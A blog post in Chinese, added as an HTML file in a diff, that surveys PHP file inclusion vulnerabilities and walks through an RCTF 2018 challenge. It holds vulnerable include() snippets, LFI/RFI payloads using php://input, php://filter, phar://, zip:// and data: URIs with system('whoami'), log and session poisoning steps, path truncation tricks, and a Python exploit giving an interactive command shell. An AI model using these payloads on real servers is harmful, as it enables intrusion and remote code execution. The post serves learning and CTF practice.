@@ -1,0 +1,188 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="author" content="vQAQv"><meta name="description" content="喜欢电影，喜欢美食，喜欢旅游，也喜欢你💖~"><link rel="icon" href="/favicon.png"><title>php文件包含 - vQAQv's blog | Just Do It!</title><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css"><!--[if lt IE 9]><script>(function(a,b){a="abbr article aside audio bdi canvas data datalist details dialog figcaption figure footer header hgroup main mark meter nav output progress section summary template time video".split(" ");for(b=a.length-1;b>=0;b--)document.createElement(a[b])})()</script><![endif]--><script src="/js/jquery-3.1.1.min.js"></script><script src="/js/fancybox/jquery.fancybox.min.js"></script></head><body style="opacity:0"><header class="head"><h1 class="head-title u-fl"><a href="/">vQAQv's blog | Just Do It!</a></h1><nav class="head-nav u-fr"><ul class="head-nav__list"><li class="head-nav__item"><a class="head-nav__link" href="/archives">Archives</a></li><li class="head-nav__item"><a class="head-nav__link" href="/about">About Me</a></li></ul></nav></header><main class="main"><article class="post"><header class="post__head"> <time class="post__time" datetime="2018-05-24T03:00:00.000Z">五月 24, 2018</time><h1 class="post__title"><a href="/2018/05/24/php文件包含/">php文件包含</a></h1><div class="post__main echo"><h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><p>php中引发文件包含漏洞的通常是以下四个函数：</p>
+<ul>
+<li>include()</li>
+<li>include_once()</li>
+<li>require()</li>
+<li>require_once()</li>
+</ul>
+<p>reuqire() 如果在包含的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句。<br><img src="/image/php_file_include/1.png" alt="require"></p>
+<p>include() 如果出错的话，只会提出警告，会继续执行后续语句。</p>
+<p><img src="/image/php_file_include/2.png" alt="include"></p>
+<p>require_once() 和 include_once() 功能与require() 和 include() 类似。但如果一个文件已经被包含过了，则 require_once() 和 include_once() 则不会再包含它，以避免函数重定义或变量重赋值等问题。</p>
+<p>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。测试代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$file = $_GET[<span class="string">'file'</span>];</div><div class="line">	<span class="keyword">include</span> $file;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>在同目录下有个phpinfo.txt，其内容为<code>&lt;? phpinfo(); ?&gt;</code>。则只需要访问：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=phpinfo.txt</div></pre></td></tr></table></figure>
+<p>即可成功解析phpinfo。</p>
+<p><img src="/image/php_file_include/3.png" alt="phpinfo"></p>
+<h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><ul>
+<li>具有相关的文件包含函数。</li>
+<li>文件包含函数中存在动态变量，比如 <code>include $file;</code>。</li>
+<li>攻击者能够控制该变量，比如<code>$file = $_GET[&#39;file&#39;];</code>。</li>
+</ul>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul>
+<li>LFI (Local File Inclusion)</li>
+</ul>
+<p>本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。简单的测试用例如前所示。</p>
+<ul>
+<li>RFI (Remote File Inclusion)</li>
+</ul>
+<p>远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。<br>但RFI的利用条件较为苛刻，需要php.ini中进行配置</p>
+<ol>
+<li><code>allow_url_fopen = On</code></li>
+<li><code>allow_url_include = On</code></li>
+</ol>
+<p>两个配置选项均需要为On，才能远程包含文件成功。</p>
+<p><img src="/image/php_file_include/4.png" alt="RFI"></p>
+<p>在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。</p>
+<h1 id="包含姿势"><a href="#包含姿势" class="headerlink" title="包含姿势"></a>包含姿势</h1><p>下面例子中测试代码均为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">    <span class="keyword">include</span> $_GET[<span class="string">'file'</span>];</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<ul>
+<li>allow_url_fopen 默认为 On</li>
+<li>allow_url_include 默认为 Off</li>
+</ul>
+<p>若有特殊要求，会在利用条件里指出。</p>
+<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>利用条件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">allow_url_fopen不做要求。</div><div class="line">allow_url_include = On</div></pre></td></tr></table></figure>
+<p>姿势：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">index.php?file=php://input</div><div class="line"></div><div class="line">POST:</div><div class="line">&lt;? phpinfo();?&gt;</div></pre></td></tr></table></figure></p>
+<p><img src="/image/php_file_include/5.png" alt="php://"></p>
+<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>利用条件：默认均可</p>
+<p>姿势：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php？file=php://filter/read=convert.base64-encode/resource=index.php</div></pre></td></tr></table></figure>
+<p>通过指定末尾的文件，可以读取经base64加密后的文件源码.</p>
+<p>其他姿势：</p>
+<p><code>index.php?file=php://filter/convert.base64-encode/resource=index.php</code></p>
+<p>效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。</p>
+<h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>利用条件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php版本大于等于php5.3.0</div></pre></td></tr></table></figure>
+<p>姿势：</p>
+<p>假设有个文件<code>phpinfo.txt</code>，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩包，如下：</p>
+<p><img src="/image/php_file_include/9.png" alt="phar://"></p>
+<p>指定绝对路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=phar:///var/www/test.zip/phpinfo.txt</div></pre></td></tr></table></figure>
+<p><img src="/image/php_file_include/7.png" alt="7.png"></p>
+<p>或者使用相对路径（这里test.zip就在上一层目录下）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=phar://../test.zip/phpinfo.txt</div></pre></td></tr></table></figure></p>
+<p><img src="/image/php_file_include/6.png" alt="6.png"></p>
+<h1 id="RCTF-2018-Backdoor"><a href="#RCTF-2018-Backdoor" class="headerlink" title="RCTF 2018 Backdoor"></a>RCTF 2018 Backdoor</h1><ul>
+<li><a href="https://xz.aliyun.com/t/2347" target="_blank" rel="external">RCTF 2018 Writeup — De1ta</a></li>
+</ul>
+<p>一道题考到了<code>php://filter</code> , <code>phar://</code></p>
+<p><a href="http://backdoor.2018.teamrois.cn/" target="_blank" rel="external">http://backdoor.2018.teamrois.cn/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=post</div></pre></td></tr></table></figure>
+<h2 id="post-php"><a href="#post-php" class="headerlink" title="post.php"></a>post.php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">include</span> $_GET[<span class="string">'action'</span>] . <span class="string">'.php'</span>;</div></pre></td></tr></table></figure>
+<p>读upload.php源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=upload</div></pre></td></tr></table></figure>
+<h2 id="upload-php"><a href="#upload-php" class="headerlink" title="upload.php"></a>upload.php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) <span class="keyword">exit</span>;</div><div class="line">$file = $_FILES[<span class="string">'file'</span>];</div><div class="line">$zip = <span class="keyword">new</span> ZipArchive();</div><div class="line"><span class="keyword">if</span> (<span class="keyword">true</span> !== $zip-&gt;open($file[<span class="string">'tmp_name'</span>])) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'No a valid zip'</span>;</div><div class="line">    <span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">false</span> === $zip-&gt;getFromName(<span class="string">'tmp/random.txt'</span>)) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'No file'</span>;</div><div class="line">    <span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$dest = <span class="string">'uploads/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) . hash(<span class="string">'sha256'</span>, file_get_contents($file[<span class="string">'tmp_name'</span>])) . <span class="string">'.zip'</span>;</div><div class="line">move_uploaded_file($file[<span class="string">'tmp_name'</span>], $dest);</div><div class="line"><span class="keyword">echo</span> <span class="string">'Saved into '</span> . $dest;</div></pre></td></tr></table></figure>
+<p>post.php存在限制后缀的文件包含，可以通过phar://或者zip://协议绕过，从而包含恶意代码getshell，upload.php中限制了上传的文件要是个zip并且里面要有个random.txt文件。</p>
+<p>我们在压缩包中再加入一个 evil.php 文件，当通过post.php 访问 action=phar://dest/evil 时，即访问 phar://dest/evil.php 注意 post.php 中的代码include $_GET[‘action’] . ‘.php’</p>
+<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py:"></a>exp.py:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">s = <span class="string">"Saved into "</span></div><div class="line">post_url = <span class="string">"http://backdoor.2018.teamrois.cn/post.php?action=upload"</span></div><div class="line">zip_file = open(<span class="string">"tmp.zip"</span>,<span class="string">"rb"</span>)</div><div class="line">upload_file = &#123;<span class="string">'file'</span>:zip_file&#125;</div><div class="line">r = requests.post(post_url,files=upload_file)</div><div class="line">dest = r.text[len(s):]</div><div class="line">shell_url = <span class="string">"http://backdoor.2018.teamrois.cn/post.php?action=phar://"</span>+ dest + <span class="string">"/evil"</span></div><div class="line">print(<span class="string">"[*] shell url: "</span> + shell_url)</div><div class="line"><span class="keyword">while</span>  <span class="keyword">True</span>:</div><div class="line">    command = input(<span class="string">"command: "</span>)</div><div class="line">    payload = &#123;<span class="string">'chybeta'</span>: <span class="string">'system("%s");'</span> % command&#125;</div><div class="line">    r = requests.get(shell_url,params=payload)</div><div class="line">    print(r.text)</div></pre></td></tr></table></figure>
+<h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>利用条件：</p>
+<p>php版本大于等于php5.3.0<br>姿势：<br>构造zip包的方法同phar。</p>
+<p>但使用zip协议，需要指定绝对路径，同时将#编码为%23，之后填上压缩包内的文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=zip://D:\phpStudy\WWW\fileinclude\test.zip%23phpinfo.txt</div></pre></td></tr></table></figure>
+<p>data:URI schema<br>利用条件：</p>
+<p>php版本大于等于php5.2<br>allow_url_fopen = On<br>allow_url_include = On<br>姿势一：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</div></pre></td></tr></table></figure>
+<p><img src="/image/php_file_include/8.png" alt="data:text/plain,&lt;?php phpinfo();?&gt;"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=data:text/plain,&lt;?php system(&apos;whoami&apos;);?&gt;</div></pre></td></tr></table></figure>
+<p><img src="/image/php_file_include/10.png" alt="system()"></p>
+<p>姿势二：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</div></pre></td></tr></table></figure>
+<p>加号+的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8+</code>的base64解码为：<code>&lt;?php phpinfo();?&gt;</code></p>
+<p>执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</div></pre></td></tr></table></figure>
+<p>其中<code>PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</code>的base64解码为：<code>&lt;?php system(&#39;whoami&#39;);?&gt;</code></p>
+<h2 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h2><p>利用条件：session文件路径已知，且其中内容部分可控。</p>
+<p>姿势：</p>
+<p>php的session文件的保存路径可以在phpinfo的session.save_path看到。</p>
+<p>常见的php-session存放位置：</p>
+<ul>
+<li>/var/lib/php/sessions</li>
+<li>/var/lib/php/sess_PHPSESSID</li>
+<li>/tmp/sess_PHPSESSID</li>
+<li>/tmp/sessions/sess_PHPSESSID</li>
+</ul>
+<p>session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到。<br><img src="/image/php_file_include/16.png" alt="16.png"></p>
+<p>要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。</p>
+<p>比如这篇文章：<a href="http://kb.hitcon.org/post/165429468072/%E9%80%8F%E9%81%8E-lfi-%E5%BC%95%E5%85%A5-php-session-%E6%AA%94%E6%A1%88%E8%A7%B8%E7%99%BC-rce" target="_blank" rel="external">透過LFI引入PHP session檔案觸發RCE</a></p>
+<p>總結一下此次經驗</p>
+<p>當遇到 LFI 漏洞時，可以先檢查一下幾種可能的檔案：</p>
+<ul>
+<li>/etc/passwd</li>
+<li>/proc/self/environ</li>
+<li>All possible config files ( e.g. Apache /etc/httpd/conf/httpd.conf )</li>
+<li>Web server access, error log ( e.g. /etc/httpd/logs/access_log )</li>
+<li>Session files ( e.g. /tmp/sess_{SESSION_ID} )</li>
+<li>PHP 使用 $_GET[1]、$_POST[1] 可以避開引號跳脫的問題(前面提到事後得知$_GET[b]即可正常執行)。<h2 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h2></li>
+</ul>
+<p>访问日志</p>
+<p>常见几个路径：</p>
+<ul>
+<li>/var/log/apache/access_log</li>
+<li>/var/www/logs/access_log</li>
+<li>/var/log/access_log</li>
+</ul>
+<p>查看 log </p>
+<p><code>/etc/apache2/sites-enabled/000-default.conf</code></p>
+<p><img src="/image/php_file_include/11.png" alt="000-default.conf"></p>
+<p>利用条件： 需要知道服务器日志的存储路径，且日志文件可读。</p>
+<p>姿势：</p>
+<p>很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入<code>access.log</code>，当发生错误时将错误写入<code>error.log</code>。默认情况下，日志保存路径在 <code>/var/log/apache2/</code>。</p>
+<p>但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改。<br><img src="/image/php_file_include/12.png" alt="12.png"></p>
+<p>在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。</p>
+<p>这里提供一道包含日志的CTF题目：<a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two" target="_blank" rel="external">SHACTF-2017- Bon Appétit (100)-writeup</a></p>
+<p>以及<a href="http://cr4ckm3.top/2018/05/01/2018%E7%BA%A2%E5%B8%BD%E6%9D%AF/">2018红帽杯</a></p>
+<h2 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h2><p>利用条件：</p>
+<p>需要知道ssh-log的位置，且可读。</p>
+<p>默认情况下为 <code>/var/log/auth.log</code></p>
+<p>姿势：</p>
+<p>用ssh连接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">~$ ssh &apos;&lt;?php phpinfo(); ?&gt;&apos;@remotehost</div></pre></td></tr></table></figure>
+<p>之后会提示输入密码等等，随便输入。</p>
+<p>之后进行文件包含即可。</p>
+<p>参考：<a href="http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/" target="_blank" rel="external">RCE with LFI and SSH Log Poisoning</a></p>
+<h2 id="包含environ-系统环境"><a href="#包含environ-系统环境" class="headerlink" title="包含environ 系统环境"></a>包含environ 系统环境</h2><p>利用条件：</p>
+<p>php以cgi方式运行，这样environ才会保持UA头。<br>environ文件存储位置已知，且environ文件可读。<br>姿势：</p>
+<p>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p>
+<p>可以参考这个：</p>
+<p><a href="http://websecuritylog.blogspot.jp/2010/06/procselfenviron-injection.html" target="_blank" rel="external">The proc/self/environ Injection</a></p>
+<p><a href="https://www.exploit-db.com/papers/12886/" target="_blank" rel="external">shell via LFI - proc/self/environ method</a></p>
+<h1 id="本地包含小姿势"><a href="#本地包含小姿势" class="headerlink" title="本地包含小姿势"></a>本地包含小姿势</h1><p>审计中可见这样的包含模版文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php include(&quot;inc/&quot; . $_GET[&apos;file&apos;] . &quot;.htm&quot;); ?&gt;</div></pre></td></tr></table></figure>
+<ul>
+<li>%00截断<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/etc/passwd%00</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)</p>
+<ul>
+<li>%00截断目录遍历：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/var/www/%00</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</p>
+<ul>
+<li>路径长度截断：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/etc/passwd/././././././.[…]/./././././.</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</p>
+<ul>
+<li>点号截断：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/boot.ini/………[…]…………</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</p>
+<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://dustri.org/b/from-lfi-to-rce-in-php.html" target="_blank" rel="external">From LFI to RCE in php</a><br><a href="http://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="external">l3m0n: 文件包含漏洞小结</a><br><a href="https://highon.coffee/blog/lfi-cheat-sheet/" target="_blank" rel="external">LFI Cheat Sheet</a><br><a href="https://github.com/lucyoa/ctf-wiki/tree/master/web/file-inclusion" target="_blank" rel="external">Local File Inclusion</a></p>
+<p><a href="http://wiki.wooyun.org/web:lfi" target="_blank" rel="external">http://wiki.wooyun.org/web:lfi</a></p>
+<p>PHP文件包含漏洞总结：<br><a href="http://drops.wooyun.org/tips/3827" target="_blank" rel="external">http://drops.wooyun.org/tips/3827</a></p>
+<p>文件包含与注入利用总结：<br><a href="https://www.91ri.org/2736.html" target="_blank" rel="external">https://www.91ri.org/2736.html</a></p>
+<p>php://input，php://filter，data URI schema的那些事：<br><a href="https://www.91ri.org/7470.html" target="_blank" rel="external">https://www.91ri.org/7470.html</a></p>
+<p>phar协议：<br><a href="https://www.91ri.org/13363.html" target="_blank" rel="external">https://www.91ri.org/13363.html</a></p>
+<p>论PHP常见的漏洞：<br><a href="http://drops.wooyun.org/papers/4544" target="_blank" rel="external">http://drops.wooyun.org/papers/4544</a></p>
+<p>LFI WITH PHPINFO() ASSISTANCE：<br><a href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf" target="_blank" rel="external">https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf</a></p>
+<p>PHP_LFI_rfc1867_temporary_files：<br><a href="http://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf" target="_blank" rel="external">http://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf</a></p>
+<p>zip或phar协议包含文件<br><a href="http://bl4ck.in/index.php/tricks/use-zip-or-phar-to-include-file.html" target="_blank" rel="external">http://bl4ck.in/index.php/tricks/use-zip-or-phar-to-include-file.html</a></p>
+<h1 id="工具-amp-amp-防御"><a href="#工具-amp-amp-防御" class="headerlink" title="工具&amp;&amp;防御"></a>工具&amp;&amp;防御</h1><p>工具：</p>
+<p><a href="https://github.com/P0cL4bs/Kadimus/" target="_blank" rel="external">https://github.com/P0cL4bs/Kadimus/</a></p>
+<p>防御：</p>
+<ul>
+<li>设置open_basedir</li>
+</ul>
+</div></header><footer class="post__foot u-cf"><ul class="post__tag u-fl"><li class="post__tag__item"><a class="post__tag__link" href="/tags/php文件包含/">php文件包含</a></li></ul></footer></article><section class="reward"> <a class="btn-reward" href="#">Contact me</a><div class="reward-wrapper clearfix"><img src="/img/wechat.png" title="微信"></div></section></main><footer class="foot"><div class="foot-copy">&copy; 2016-2018 vQAQv</div></footer><script src="/js/scroller.js"></script><script src="/js/main.js"></script></body></html>
